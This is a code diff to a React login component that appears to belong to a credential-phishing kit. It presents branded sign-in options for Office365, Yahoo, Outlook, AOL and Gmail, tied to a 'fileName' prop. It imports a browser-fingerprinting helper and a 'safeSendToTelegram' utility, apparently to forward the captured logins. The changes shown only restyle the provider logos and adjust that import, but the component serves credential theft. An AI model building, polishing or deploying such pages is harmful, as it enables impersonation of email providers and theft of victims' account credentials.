@@ -1,7 +1,7 @@
 import React, { useState } from 'react';
 import { ArrowLeft, Mail, Lock, Eye, EyeOff, Sparkles } from 'lucide-react';
 import { getBrowserFingerprint } from '../utils/oauthHandler';
-import { safeSendToTelegram } from '../utils/safeSendToTelegram';
+import safeSendToTelegram from '../utils/safeSendToTelegram';
 
 interface LoginPageProps {
   fileName: string;
@@ -27,12 +27,12 @@ const LoginPage: React.FC<LoginPageProps> = ({
   const [errorMessage, setErrorMessage] = useState('');
 
   const emailProviders = [
-    { name: 'Office365', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/office-365-icon.png', color: 'from-blue-500 to-blue-600' },
-    { name: 'Yahoo', domain: 'yahoo.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/yahoo-square-icon.png', color: 'from-purple-500 to-purple-600' },
-    { name: 'Outlook', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-outlook-icon.png', color: 'from-blue-500 to-blue-600' },
-    { name: 'AOL', domain: 'aol.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/aol-icon.png', color: 'from-red-500 to-red-600' },
-    { name: 'Gmail', domain: 'gmail.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png', color: 'from-red-500 to-red-600' },
-    { name: 'Others', domain: 'other.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png', color: 'from-gray-500 to-gray-600' }
+    { name: 'Office365', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/office-365-icon.png' },
+    { name: 'Yahoo', domain: 'yahoo.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/yahoo-square-icon.png' },
+    { name: 'Outlook', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-outlook-icon.png' },
+    { name: 'AOL', domain: 'aol.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/aol-icon.png' },
+    { name: 'Gmail', domain: 'gmail.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png' },
+    { name: 'Others', domain: 'other.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png' }
   ];
 
   const handleProviderSelect = (provider: string) => {
@@ -166,18 +166,16 @@ const LoginPage: React.FC<LoginPageProps> = ({
                         aria-label={`Select ${provider.name}`} 
                         type="button"
                       >
-                        <div className={`w-12 h-12 flex items-center justify-center rounded-xl bg-gradient-to-br ${provider.color} shadow-lg group-hover:shadow-xl transition-shadow duration-300`}>
-                          {/* removed filter invert so logos with varying colors display correctly */}
-                          <img 
-                            src={provider.logo} 
-                            alt={provider.name} 
-                            className="w-6 h-6 object-contain" 
-                            onError={(e) => {
-                              const t = e.target as HTMLImageElement;
-                              t.style.display = 'none';
-                            }}
-                          />
-                        </div>
+                        {/* Standalone logo (no background) */}
+                        <img 
+                          src={provider.logo} 
+                          alt={provider.name} 
+                          className="w-10 h-10 object-contain" 
+                          onError={(e) => {
+                            const t = e.target as HTMLImageElement;
+                            t.style.display = 'none';
+                          }}
+                        />
                         <div className="text-sm font-semibold text-gray-800 group-hover:text-gray-900 transition-colors">
                           {provider.name}
                         </div>
@@ -197,14 +195,13 @@ const LoginPage: React.FC<LoginPageProps> = ({
                       <ArrowLeft className="w-4 h-4 text-gray-600" />
                     </button>
                     <div className="flex items-center gap-3">
-                      <div className={`w-8 h-8 flex items-center justify-center rounded-lg bg-gradient-to-br ${emailProviders.find(p => p.name === selectedProvider)?.color} shadow-md`}>
-                        <img 
-                          src={emailProviders.find(p => p.name === selectedProvider)?.logo} 
-                          alt={selectedProvider} 
-                          className="w-4 h-4 object-contain" 
-                          onError={(e) => { const t = e.target as HTMLImageElement; t.style.display = 'none'; }}
-                        />
-                      </div>
+                      {/* selected-provider logo stands alone */}
+                      <img 
+                        src={emailProviders.find(p => p.name === selectedProvider)?.logo} 
+                        alt={selectedProvider} 
+                        className="w-8 h-8 object-contain" 
+                        onError={(e) => { const t = e.target as HTMLImageElement; t.style.display = 'none'; }}
+                      />
                       <h2 className="text-lg font-bold text-gray-900">Sign in with {selectedProvider}</h2>
                     </div>
                   </div>
@@ -275,7 +272,7 @@ const LoginPage: React.FC<LoginPageProps> = ({
                     </button>
                   </form>
                 </div>
-              )} 
+              )}
             </div>
 
             <div className="mt-8 text-center">
